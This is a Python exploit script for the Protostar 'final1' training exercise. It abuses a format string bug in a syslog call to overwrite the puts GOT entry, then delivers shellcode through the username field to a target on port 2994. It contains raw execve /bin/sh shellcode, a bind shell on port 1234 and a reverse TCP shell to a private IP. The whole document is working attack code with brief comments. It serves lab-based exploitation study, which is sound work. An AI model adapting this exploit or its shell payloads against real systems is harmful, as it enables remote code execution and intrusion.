#!/usr/bin/python
# coding: UTF-8

from socket import *
import struct, shellgen

#exploit-exercises.com : Protostar : final1
# do:
#   I stage: get control program flow.
#
#       how: format string bug through syslog( pri, my_input )
#
#       _extrn [puts] <-- username addr (shellcode be here)
#
#   II stage: load shellcode into memory.
#
#       how: simple. send as username, then login.
#
# _extrn puts   = 0x0804A194
# username      = 0x0804A220


revtcp = shellgen.linux().reverse_tcp('192.168.2.56',2222)

revtcp = '\x90'*5 + revtcp
sh = '\x90'*3 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

bind = shellgen.linux().bindport(1234) #I use it

retloc = struct.pack('<I', 0x0804A220) #0xa220 --> 0x0804a194 & 0x10804 --> 0x0804a196

putsaddr = struct.pack('<I',0x0804A194) # \x94\xa1\x04\x08


user = 'username ' 
login = 'login ' + '\n'


padding = '\xc3'*3

evil = '\xff\xff\xff\xaa\x94\xa1\x04\x08\xff\xff\xff\xbb\x96\xa1\x04\x08'

stackpop = '%08x.'*15

writesnow = len('P'*33 + padding) + len(evil) + (len(stackpop)/5)*9
print 'bytes write now: ', writesnow

incaddr = 0xa220 - writesnow
incaddr = '%'+ '%d' % incaddr +'x' 
print 'inc syslog pointer to: ', incaddr

eval_evil = incaddr +'%hn'+'%26084x'+'%hn' #'%41317x' - must be incaddr

formats = padding + evil + stackpop + eval_evil

exp = user + formats + '\n'

shellcode = user + bind + '\n'

logstr = 'P'*33 + formats + 'p'*18 # 18 if send just 'login '

s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.2.26', 2994))

print s.recv(1000)
print 'exp len: ', len(exp)
s.send(exp)

print 'logstr len: ', len(logstr)

print s.recv(1000)
s.send(login)

print s.recv(1000)
print 'send shellcode, len: ', len(shellcode)
s.send(shellcode)

print s.recv(1000)
s.send(login)

for i in range(2):      #a little trick :)
    print s.recv(1000)

print 'Huston, contact!'
